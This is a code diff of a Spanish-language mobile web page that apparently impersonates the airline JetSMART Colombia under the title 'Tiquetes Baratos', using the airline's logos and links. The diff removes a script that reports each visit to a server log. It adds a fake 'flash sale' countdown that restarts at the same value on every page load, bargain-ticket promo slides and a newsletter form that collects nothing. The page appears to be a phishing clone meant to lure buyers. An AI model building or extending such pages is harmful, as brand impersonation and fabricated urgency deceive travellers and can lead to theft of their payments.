@@ -4,33 +4,153 @@
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Tiquetes Baratos | Pasajes en avión</title>
-        <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon">
+        <link rel="shortcut icon" href="assets/favicon.png" type="image/x-icon">
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
-        <!-- CSS -->
-        <link rel="stylesheet" href="./css/normalize.css">
-        <link rel="stylesheet" href="./css/utils.css">
-        <link rel="stylesheet" href="./css/main.css">
-        <link rel="stylesheet" href="./css/hotel-datepicker.css">
-        <!-- JS -->
-        <script src="./js/functions.js"></script>
-        <script>
-document.addEventListener("DOMContentLoaded", function() {
-    let mensaje = "Un usuario ha entrado en la pagina de inicio"; // Mensaje siempre válido
-
-    fetch("snLogs.php", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mensaje: mensaje }) // JSON bien formado
-    })
-    .then(response => response.json())
-    .then(data => console.log("Notificación enviada:", data))
-    .catch(error => console.error("Error al notificar:", error));
-});
-</script>
+        <link rel="stylesheet" href="css/normalize.css">
+        <link rel="stylesheet" href="css/utils.css">
+        <link rel="stylesheet" href="css/main.css">
+        <link rel="stylesheet" href="css/hotel-datepicker.css">
+        <style>
+            body {
+                margin: 0;
+                font-family: Arial, sans-serif;
+                background-color: #f4f4f4;
+            }
+            .newsletter-container {
+                position: fixed;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                background-color: #00bcd4;
+                border-radius: 10px 10px 0 0;
+                padding: 30px 20px 20px;
+                text-align: center;
+                box-shadow: 0 -4px 12px rgba(0, 0, 0, 0.2);
+                z-index: 9999;
+            }
+            .newsletter-container h2 {
+                margin-bottom: 20px;
+                font-size: 20px;
+                color: white;
+            }
+            .input-group {
+                display: flex;
+                justify-content: center;
+                margin-bottom: 20px;
+                border-radius: 25px;
+                overflow: hidden;
+                background: white;
+                max-width: 500px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            .input-group input[type="email"] {
+                flex: 1;
+                padding: 10px 15px;
+                border: none;
+                outline: none;
+                font-size: 16px;
+            }
+            .input-group button {
+                background-color: #5e4455;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                cursor: pointer;
+                font-size: 16px;
+                white-space: nowrap;
+            }
+            .checkbox-group {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-bottom: 10px;
+                font-size: 14px;
+            }
+            .checkbox-group input[type="checkbox"] {
+                margin-right: 10px;
+                transform: scale(1.2);
+            }
+            .checkbox-group label {
+                color: #a30000;
+                font-weight: bold;
+            }
+            .policy-note {
+                font-size: 13px;
+                color: #e0f7fa;
+            }
+            .policy-note a {
+                color: #002b47;
+                text-decoration: underline;
+            }
+            * {
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+            }
+            .slider-container {
+                position: relative;
+                width: 100%;
+                max-width: 100vw;
+                height: 250px;
+                overflow: hidden;
+            }
+            .slider {
+                display: flex;
+                transition: transform 0.5s ease-in-out;
+                height: 100%;
+            }
+            .slide {
+                min-width: 100%;
+                background-size: cover;
+                background-position: center;
+            }
+            .arrow {
+                position: absolute;
+                top: 50%;
+                transform: translateY(-50%);
+                font-size: 60px;
+                padding: 20px;
+                background: transparent;
+                color: white;
+                border: none;
+                cursor: pointer;
+                z-index: 2;
+                transition: color 0.3s ease;
+            }
+            .arrow:hover {
+                color: #B90000;
+            }
+            .arrow.left {
+                left: 2px;
+            }
+            .arrow.right {
+                right: 2px;
+            }
+            .dots {
+                position: absolute;
+                bottom: 25px;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+                gap: 16px;
+            }
+            .dot {
+                width: 24px;
+                height: 24px;
+                border-radius: 50%;
+                background-color: #ccc;
+                cursor: pointer;
+                transition: background-color 0.3s ease;
+            }
+            .dot.active {
+                background-color: #ca3f3f;
+            }
+        </style>
+        <script src="js/functions.js"></script>
     </head>
-    
-    <body>
 
+    <body>
         <div class="loader">
             <svg class="svg-calLoader" xmlns="http://www.w3.org/2000/svg" width="230" height="230">
                 <path class="cal-loader__path" d="M86.429 40c63.616-20.04 101.511 25.08 107.265 61.93 6.487 41.54-18.593 76.99-50.6 87.643-59.46 19.791-101.262-23.577-107.142-62.616C29.398 83.441 59.945 48.343 86.43 40z" fill="none" stroke="#0099cc" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="10 10 10 10 10 10 10 432" stroke-dashoffset="77"/>
@@ -40,62 +160,171 @@ document.addEventListener("DOMContentLoaded", function() {
         <nav>
             <div class="d-flex justify-space-between p-2">
                 <div>
-                    <img src="./assets/media/jetsmart-logo.svg" width="130px">
+                    <img src="assets/media/jetsmart-logo.svg" width="130px">
                 </div>
                 <div class="d-flex flex-row align-items-center">
-                    <img class="rounded-circle mr-1" src="./assets/media/colombia.png" width="12px" height="12px">
+                    <img class="rounded-circle mr-1" src="assets/media/colombia.png" width="12px" height="12px">
                     <span>Colombia</span>
                     <div class="ml-1">
-                        <img src="./assets/media/hamburguer_menu.png" width="35px">
+                        <img src="assets/media/hamburguer_menu.png" width="35px">
                         <p class="fs-7 m-0 text-center">MENÚ</p>
                     </div>
                 </div>
             </div>
         </nav>
         <main class="bg-gray-soft">
-            <header>
-                <!-- SLIDER -->
-                <div class="slider">
-                    <div class="slide-container">
-                        <div class="slide">
-                            <div class="bg-slide-1 d-flex justify-content-center align-items-center p-3">
-                                <img src="https://assets-us-01.kc-usercontent.com:443/b2956330-c34f-0064-2c6f-27bd5c0147fc/8b0e1ab3-4137-4eb4-824d-1b16f3f54e1f/Caja_CO.png?auto=format&q=80./assets/media/slide_1.png" width="340px">
-                            </div>
-                        </div>
-                        <div class="slide">
-                            <div class="bg-slide-2 d-flex justify-content-center align-items-center p-3">
-                                <img src="./assets/media/slide_1.webp" width="340px">
-                            </div>
-                        </div>
-                        <div class="slide">
-                            <div class="bg-slide-1 d-flex justify-content-center align-items-center p-3">
-                                <img src="./assets/media/slide_3.webp" width="340px">
-                            </div>
-                        </div>
+            <div style="background-image:url('img/fondo.png');background-size:cover;background-position:center;color:white;text-align:center;padding:12px;font-family:Arial,sans-serif;">
+                <div style="font-size:14px;margin-bottom:8px;">
+                    <img src="img/smartdays-removebg-preview.png" alt="Promo Flash" style="height:30px; vertical-align:middle; margin-right:6px;" />
+                    <span style="font-weight:normal;">¡Todas las rutas nacionales con descuento😍!</span>
+                </div>
+
+                <div style="display:flex;justify-content:center;align-items:center;">
+                    <div style="background-color:#00c0e3;border-radius:5px;width:45px;padding:6px 0;margin:0 4px;">
+                        <div id="days" style="font-size:18px;font-weight:900;">03</div>
+                        <span style="font-size:12px; font-weight: bold;">Días</span>
+                    </div>
+                    <div style="font-size:18px;margin:0 4px;">:</div>
+                    <div style="background-color:#00c0e3;border-radius:5px;width:45px;padding:6px 0;margin:0 4px;">
+                        <div id="hours" style="font-size:18px;font-weight:bold;">13</div>
+                        <span style="font-size:12px;">Hr</span>
+                    </div>
+                    <div style="font-size:18px;margin:0 4px;">:</div>
+                    <div style="background-color:#00c0e3;border-radius:5px;width:45px;padding:6px 0;margin:0 4px;">
+                        <div id="minutes" style="font-size:18px;font-weight:bold;">16</div>
+                        <span style="font-size:12px;">Min</span>
+                    </div>
+                    <div style="font-size:18px;margin:0 4px;">:</div>
+                    <div style="background-color:#00c0e3;border-radius:5px;width:45px;padding:6px 0;margin:0 4px;">
+                        <div id="seconds" style="font-size:18px;font-weight:bold;">04</div>
+                        <span style="font-size:12px;">Seg</span>
                     </div>
                 </div>
-            </header>
+            </div>
+
+            <script>
+                const countdownDate = new Date();
+                countdownDate.setSeconds(countdownDate.getSeconds() + (3 * 86400) + (13 * 3600) + (16 * 60) + 4);
+
+                function updateCountdown() {
+                    const now = new Date().getTime();
+                    const distance = countdownDate - now;
+
+                    if (distance <= 0) {
+                        document.getElementById("days").textContent = "00";
+                        document.getElementById("hours").textContent = "00";
+                        document.getElementById("minutes").textContent = "00";
+                        document.getElementById("seconds").textContent = "00";
+                        return;
+                    }
+
+                    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                    const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
+                    const minutes = Math.floor((distance / (1000 * 60)) % 60);
+                    const seconds = Math.floor((distance / 1000) % 60);
+
+                    document.getElementById("days").textContent = String(days).padStart(2, "0");
+                    document.getElementById("hours").textContent = String(hours).padStart(2, "0");
+                    document.getElementById("minutes").textContent = String(minutes).padStart(2, "0");
+                    document.getElementById("seconds").textContent = String(seconds).padStart(2, "0");
+                }
+
+                setInterval(updateCountdown, 1000);
+                updateCountdown();
+            </script>
+
+            <div class="slider-container">
+                <div class="slider">
+                    <div class="slide" style="background-image: url('img/caja2fondo.webp');">
+                        <center>
+                            <img src="img/caja2.png" width="70%" alt="">
+                            <br>
+                            <button style="background-color: #ca3f3f; color: white; padding: 1%; font-size: 12px; border-radius: 30px; border: none;">CANJEA AQUÍ</button>
+                        </center>
+                    </div>
+                    <div class="slide" style="background-image: url('img/tu_imagenfondo.png');">
+                        <center>
+                            <img src="img/precio57k.png" width="70%" alt="">
+                            <br>
+                            <button style="background-color: #ca3f3f; color: white; padding: 1%; font-size: 12px; border-radius: 30px; border: none;">COMPRA AQUÍ</button>
+                        </center>
+                    </div>
+                    <div class="slide" style="background-image: url('img/tu_imagenfondo.png');">
+                        <center>
+                            <img src="img/caja3.png" width="70%" alt="">
+                            <br>
+                            <button style="background-color: #ca3f3f; color: white; padding: 1%; font-size: 12px; border-radius: 30px; border: none;">COMPRA AQUÍ</button>
+                        </center>
+                    </div>
+                </div>
+                <button class="arrow left">&#8249;</button>
+                <button class="arrow right">&#8250;</button>
+                <div class="dots">
+                    <span class="dot active"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+
+            <script>
+                const slides = document.querySelectorAll('.slide');
+                const dots = document.querySelectorAll('.dot');
+                const prev = document.querySelector('.arrow.left');
+                const next = document.querySelector('.arrow.right');
+
+                let currentIndex = 0;
+
+                function updateSlider(index) {
+                    const slider = document.querySelector('.slider');
+                    slider.style.transform = `translateX(-${index * 100}%)`;
+
+                    slides.forEach((slide, i) => {
+                        slide.classList.toggle('active', i === index);
+                    });
+                    dots.forEach((dot, i) => {
+                        dot.classList.toggle('active', i === index);
+                    });
+                    currentIndex = index;
+                }
+
+                dots.forEach((dot, i) => {
+                    dot.addEventListener('click', () => updateSlider(i));
+                });
+
+                prev.addEventListener('click', () => {
+                    const newIndex = (currentIndex - 1 + slides.length) % slides.length;
+                    updateSlider(newIndex);
+                });
+
+                next.addEventListener('click', () => {
+                    const newIndex = (currentIndex + 1) % slides.length;
+                    updateSlider(newIndex);
+                });
+
+                setInterval(() => {
+                    updateSlider((currentIndex + 1) % slides.length);
+                }, 5000);
+            </script>
+
             <div class="shadow-1 mb-4 relative">
-                <!-- FLIGHT-SELECTOR -->
                 <div class="d-flex bg-gray-2 flex-row justify-content-center align-items-center">
                     <div class="p-1 bg-gray-1 d-flex align-items-center justify-content-center flex-column">
-                        <img src="./assets/media/plane_icon.png" width="40%">
+                        <img src="assets/media/plane_icon.png" width="60%">
                         <p class="fs-5 fw-bold tc-blue">Vuelo</p>
                     </div>
                     <div onclick="window.location.href = 'https://hoteles.jetsmart.com/searchresults.html?aid=1484809&checkin=2024-03-08&checkout=2024-03-09&dest_id=-901202&dest_type=city&fp_referrer_aid=1484819&group_adults=1&group_children=0&label=JS-Homepage-SB-click&lang=es&no_rooms=1&si=ai%2Cco%2Cci%2Cre%2Cdi&sp_plprd=UmFuZG9tSVYkc2RlIyh9YVXcKaaJl1ClbhawYIdJuz40Zhj8QD0_l0711e6iV7olYaQR5kELxdUZrsWxzDRohqXBoEABT9jnp_TAsL-4lvo0IlMcx2EOuujJEsltB0ugbJBUSqHJnx6_4TrZ7bs71A&ss=Santiago&submit=Buscar&utm_campaign=sb4&utm_medium=sp&utm_source=AW_Searchbox'" class="p-2 bg-gray-2 d-flex align-items-center justify-content-center flex-column">
-                        <img src="./assets/media/bed_icon.png" width="40%">
+                        <img src="assets/media/bed_icon.png" width="60%">
                         <p class="fs-5 fw-bold tc-blue">Hoteles</p>
                     </div>
                     <div onclick="window.location.href = 'https://hoteles.jetsmart.com/searchresults.html?aid=1484809&checkin=2024-03-08&checkout=2024-03-09&dest_id=-901202&dest_type=city&fp_referrer_aid=1484819&group_adults=1&group_children=0&label=JS-Homepage-SB-click&lang=es&no_rooms=1&si=ai%2Cco%2Cci%2Cre%2Cdi&sp_plprd=UmFuZG9tSVYkc2RlIyh9YVXcKaaJl1ClbhawYIdJuz40Zhj8QD0_l0711e6iV7olYaQR5kELxdUZrsWxzDRohqXBoEABT9jnp_TAsL-4lvo0IlMcx2EOuujJEsltB0ugbJBUSqHJnx6_4TrZ7bs71A&ss=Santiago&submit=Buscar&utm_campaign=sb4&utm_medium=sp&utm_source=AW_Searchbox'" class="p-2 bg-gray-2 d-flex align-items-center justify-content-center flex-column">
-                        <img src="./assets/media/car_icon.png" width="40%">
+                        <img src="assets/media/car_icon.png" width="60%">
                         <p class="fs-5 fw-bold tc-blue">Autos</p>
                     </div>
                     <div onclick="window.location.href = 'https://hoteles.jetsmart.com/searchresults.html?aid=1484809&checkin=2024-03-08&checkout=2024-03-09&dest_id=-901202&dest_type=city&fp_referrer_aid=1484819&group_adults=1&group_children=0&label=JS-Homepage-SB-click&lang=es&no_rooms=1&si=ai%2Cco%2Cci%2Cre%2Cdi&sp_plprd=UmFuZG9tSVYkc2RlIyh9YVXcKaaJl1ClbhawYIdJuz40Zhj8QD0_l0711e6iV7olYaQR5kELxdUZrsWxzDRohqXBoEABT9jnp_TAsL-4lvo0IlMcx2EOuujJEsltB0ugbJBUSqHJnx6_4TrZ7bs71A&ss=Santiago&submit=Buscar&utm_campaign=sb4&utm_medium=sp&utm_source=AW_Searchbox'" class="p-2 bg-gray-2 d-flex align-items-center justify-content-center flex-column">
-                        <img src="./assets/media/van_icon.png" width="40%">
+                        <img src="assets/media/van_icon.png" width="60%">
                         <p class="fs-5 fw-bold tc-blue">Traslados</p>
                     </div>
                 </div>
-                <!-- MODAL@SELECT-ORIGIN -->
                 <div id="modal-select-origin" class="modal-flight">
                     <div class="d-flex bg-gray-1 justify-space-between align-items-center pl-3 pr-3 pt-1 pb-1">
                         <p class="fs-3 m-0 fw-bold tc-blue">Origen</p>
@@ -136,7 +365,6 @@ document.addEventListener("DOMContentLoaded", function() {
                         </div>
                     </div>
                 </div>
-                <!-- MODAL@SELECT-DESTINATION -->
                 <div id="modal-select-destination" class="modal-flight">
                     <div class="d-flex bg-gray-1 justify-space-between align-items-center pl-3 pr-3 pt-1 pb-1">
                         <p class="fs-3 m-0 fw-bold tc-blue">Destino</p>
@@ -177,7 +405,6 @@ document.addEventListener("DOMContentLoaded", function() {
                         </div>
                     </div>
                 </div>
-                <!-- MODAL@SELECT-DATES -->
                 <div id="modal-select-date" class="modal-flight justify-content-center align-items-center">
                     <div class="d-flex w-100 border-box justify-content-end pl-3 pr-3 pt-1 pb-1">
                         <div id="close-modal" data-target-modal="#modal-select-date">
@@ -199,7 +426,6 @@ document.addEventListener("DOMContentLoaded", function() {
                     </div>
                     <input type="hidden" id="datepicker">
                 </div>
-                <!-- MODAL@SELECT-PASSENGERS -->
                 <div id="modal-edit-passengers" class="modal-flight justify-content-start p-1 tc-blue">
                     <div class="d-flex justify-content-end pl-2 pr-3 pt-2 border-box">
                         <div id="close-modal" data-target-modal="#modal-edit-passengers">
@@ -293,8 +519,7 @@ document.addEventListener("DOMContentLoaded", function() {
                             </p>
                         </div>
                     </div>
-                    <button id="close-modal" data-target-modal="#modal-edit-passengers" class="btn btn-red">OK
-                </button>
+                    <button id="close-modal" data-target-modal="#modal-edit-passengers" class="btn btn-red">OK</button>
                     <div class="border-box">
                         <p class="m-0 mt-1 fs-5 tc-red">Recuerda que la edad del niño o infante se considera al momento de terminar el viaje.</p>
                         <p class="m-0 mt-1 fs-5 tc-red">En base a la ley colombiana, el descuento en la tarifa sólo aplica para los menores de 12 años.</p>
@@ -302,7 +527,6 @@ document.addEventListener("DOMContentLoaded", function() {
                     </div>
                 </div>
                 <div class="bg-gray-1 pl-5 pr-5 pt-2 pb-2">
-                    <!-- SELECT DEPARTURES -->
                     <div class="relative">
                         <table class="select-airport tc-gray-smoke fw-bold">
                             <tr>
@@ -314,7 +538,6 @@ document.addEventListener("DOMContentLoaded", function() {
                         </table>
                         <div class="divider-arrow-1"></div>
                     </div>
-                    <!-- SELECT TRIP TYPE -->
                     <div class="d-flex justify-content-evenly align-items-center mt-2 mb-2">
                         <div class="d-flex align-items-center">
                             <input type="radio" id="roundTrip" name="tripType" class="radio-input">
@@ -327,7 +550,6 @@ document.addEventListener("DOMContentLoaded", function() {
                             <span class="fw-bold tc-blue">Solo Ida</span>
                         </div>
                     </div>
-                    <!-- SELECT DATES -->
                     <div>
                         <div class="relative">
                             <table class="select-date">
@@ -345,24 +567,21 @@ document.addEventListener("DOMContentLoaded", function() {
                             <div class="divider-arrow-2"></div>
                         </div>
                     </div>
-                    <!-- SELECT PASSENGERS -->
                     <div class="relative mt-2 d-flex justify-space-between flex-row">
                         <input id="edit-passengers" class="input-main mr-3" readonly placeholder="Pasajeros" value="1 adulto" type="text">
                         <input id="" class="input-main" placeholder="Código promocional" type="text">
                     </div>
                     <div class="d-flex justify-content-center mt-2">
-                        <button class="btn btn-red" id="btn-search-flights">🔍︎ Busca SMART ➜
-                    </button>
+                        <button class="btn btn-red" id="btn-search-flights">🔍︎ Busca SMART ➜</button>
                     </div>
                 </div>
             </div>
             <div>
-                <!-- INFO IMAGES -->
                 <div class="p-2" onclick="window.location.href = 'https://jetsmart.com/co/es/buscador-smart'">
-                    <img src="./assets/media/card_1.png" width="100%">
+                    <img style="border-radius: 10px;" src="assets/media/card_1.png" width="100%">
                 </div>
                 <div class="p-2" onclick="window.location.href = 'https://jetsmart.com/co/es/minisitios/medios-de-pago'">
-                    <img src="./assets/media/card_2.png" width="100%">
+                    <img src="assets/media/card_2.png" width="100%">
                 </div>
                 <div class="p-2">
                     <p class="fs-25 fw-bold text-center mt-1 mb-1">
@@ -372,67 +591,110 @@ document.addEventListener("DOMContentLoaded", function() {
                     <p class="fs-25 tc-blue text-center mt-1 mb-1">PAGANDO SÓLO LO QUE USAS</p>
                 </div>
                 <div class="p-2" onclick="window.location.href = 'https://jetsmart.com/co/es/minisitios/centro-ayuda-agencias'">
-                    <img src="./assets/media/card_banner_1.png" width="100%">
+                    <img src="assets/media/card_banner_1.png" width="100%">
                 </div>
                 <div class="p-2 d-flex justify-content-center" onclick="window.location.href = 'https://jetsmart.com/co/es/club_de_descuentos'">
-                    <img src="./assets/media/card_banner_3.png" width="80%">
+                    <img src="assets/media/card_banner_3.png" width="80%">
                 </div>
                 <div class="p-2" onclick="window.location.href = 'https://jetsmart.com/co/es/estado-de-vuelo'">
-                    <img src="./assets/media/card_banner_2.png" width="100%">
+                    <img src="assets/media/card_banner_2.png" width="100%">
                 </div>
                 <div class="p-2" onclick="window.location.href = 'https://jetsmart.com/co/es/minisitios/entretencion?preview=revista'">
-                    <img src="./assets/media/card_banner_4.png" width="100%">
+                    <img src="assets/media/card_banner_4.png" width="100%">
                 </div>
             </div>
         </main>
+
+        <div id="newsletter-box" style="position: fixed; bottom: 0; left: 0; right: 0; background-color: #00bcd4; padding: 5px 20px 20px; text-align: center; box-shadow: 0 -4px 12px rgba(0,0,0,0.2); z-index: 9999; border-radius: 0;">
+            <button onclick="closeNewsletter()" style="position: absolute; top: 10px; right: 15px; background: none; border: none; font-size: 20px; color: white; cursor: pointer;">×</button>
+            <h2 style="margin-bottom: 20px; font-size: 20px; color: white;">Ingresa tu mail y conoce primero nuestras <strong>ofertas.</strong></h2>
+            <div class="input-group" style="display: flex; justify-content: center; margin-bottom: 20px; overflow: hidden; background: white; max-width: 500px; margin-left: auto; margin-right: auto;">
+                <input type="email" id="email" placeholder="email@email.com" style="flex: 1; padding: 10px 15px; border: none; outline: none; font-size: 16px;" oninput="validateForm()" />
+                <button id="subscribe-btn" onclick="subscribe()" disabled style="background-color: #ca3f3f; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; white-space: nowrap;">Suscríbete</button>
+            </div>
+            <div class="checkbox-group" style="display: flex; align-items: center; justify-content: center; margin-bottom: 10px; font-size: 14px;">
+                <input type="checkbox" id="accept" style="margin-right: 10px; transform: scale(1.2);" onchange="validateForm()" />
+                <label for="accept" style="color: #a30000; font-weight: bold;">Acepto la Política de Privacidad y Tratamiento de Datos.</label>
+            </div>
+            <p style="font-size: 13px; color: #e0f7fa;">
+                Al suscribirte estás aceptando nuestra <a href="#" style="color: #002b47; text-decoration: underline;">Política de Privacidad</a>
+            </p>
+        </div>
+
+        <script>
+            function closeNewsletter() {
+                document.getElementById('newsletter-box').style.display = 'none';
+            }
+            function validateForm() {
+                const email = document.getElementById('email').value;
+                const accept = document.getElementById('accept').checked;
+                const button = document.getElementById('subscribe-btn');
+                button.disabled = !(email && accept);
+                if (button.disabled) {
+                    button.style.backgroundColor = '#5e4455';
+                } else {
+                    button.style.backgroundColor = '#ca3f3f';
+                }
+            }
+            function subscribe() {
+                const email = document.getElementById('email').value;
+                const accept = document.getElementById('accept').checked;
+                if (!email || !accept) return;
+                const box = document.getElementById('newsletter-box');
+                box.innerHTML = `
+                    <button onclick="closeNewsletter()" style="position: absolute; top: 10px; right: 15px; background: none; border: none; font-size: 20px; color: white; cursor: pointer;">×</button>
+                    <div style="background-color: #b2ebf2; color: #00363a; padding: 30px 20px; font-size: 13px; font-family: Arial, sans-serif; font-weight: bold;">
+                        ¡Felicidades! Muy pronto recibirás las mejores ofertas y nuevos destinos de<br />JetSMART.
+                    </div>
+                `;
+            }
+        </script>
+
         <footer>
             <p class="text-italic fw-bold tc-blue fs-3 pl-2 pr-2">¡PAGA COMO QUIERAS!</p>
             <div class="d-flex flex-row justify-space-between pl-2 pr-2">
                 <div class="mr-1 ml-1 d-flex justify-content-center align-items-center flex-column">
-                    <img src="./assets/media/visa_mc_footer.webp" width="100px">
+                    <img src="assets/media/visa_mc_footer.webp" width="100px">
                     <p class="tc-blue text-center">Tarjetas de débito y crédito</p>
                 </div>
                 <div class="mr-1 ml-1 d-flex justify-content-center align-items-center flex-column">
-                    <img src="./assets/media/pse.webp" width="60px">
+                    <img src="assets/media/pse.webp" width="60px">
                     <p class="tc-blue text-center">Pagos Seguros en Línea</p>
                 </div>
                 <div class="mr-1 ml-1 d-flex justify-content-center align-items-center flex-column">
-                    <img src="./assets/media/ver_mas_footer.png" width="80px">
+                    <img src="assets/media/ver_mas_footer.png" width="80px">
                 </div>
             </div>
             <div class="pt-4 pr-2 pl-2 pb-2 bg-blue-1">
                 <div class="d-flex flex-row justify-content-evenly tc-white align-items-end">
-                    <img class="mr-3" width="60px" src="./assets/media/mail_icon.png">
+                    <img class="mr-3" width="60px" src="assets/media/mail_icon.png">
                     <div>
                         <p class="m-0 fs-4">¡Sé el primero en conocer</p>
                         <p class="m-0 fs-2 fw-bold">nuestros descuentos!</p>
                     </div>
                 </div>
                 <div class="d-flex justify-content-center mt-3">
-                    <button class="btn btn-red btn-wide">SUSCRÍBETE
-                </button>
+                    <button class="btn btn-red btn-wide">SUSCRÍBETE</button>
                 </div>
             </div>
             <div class="d-flex flex-column justify-content-center align-items-center fs-4 tc-blue">
                 <p class="mt-5 mb-1">Medios de pago</p>
-                <img src="./assets/media/medios_pago_footer.png" width="150px">
+                <img src="assets/media/medios_pago_footer.png" width="150px">
                 <p class="mt-5 mb-1">Síguenos en</p>
-                <img src="./assets/media/social_media_footer.png" width="150px">
+                <img src="assets/media/social_media_footer.png" width="150px">
             </div>
             <div class="mt-5 d-flex flex-row justify-content-evenly align-items-center pl-4 pr-4">
-                <img src="./assets/media/certificado_1.webp" width="80px">
-                <img src="./assets/media/certificado_2.webp" width="80px">
-                <img src="./assets/media/certificado_3.webp" width="80px">
+                <img src="assets/media/certificado_1.webp" width="80px">
+                <img src="assets/media/certificado_2.webp" width="80px">
+                <img src="assets/media/certificado_3.webp" width="80px">
             </div>
             <div class="border-top-red mt-2 p-3 d-flex flex-column align-items-center justify-content-center">
                 <p class="fs-6 m-0">© 2025 JetSMART Colombia</p>
-                <img src="./assets/media/jetsmart-logo.svg" width="180px">
+                <img src="assets/media/jetsmart-logo.svg" width="180px">
             </div>
         </footer>
-        <!-- SCRIPTS -->
-
-        <script src="./js/fecha.js"></script>
-        <script src="./js/hotel-datepicker.js"></script>
-        <script src="./js/index.js"></script>
+        <script src="js/fecha.js"></script>
+        <script src="js/hotel-datepicker.js"></script>
+        <script src="js/index.js"></script>
     </body>
 </html>
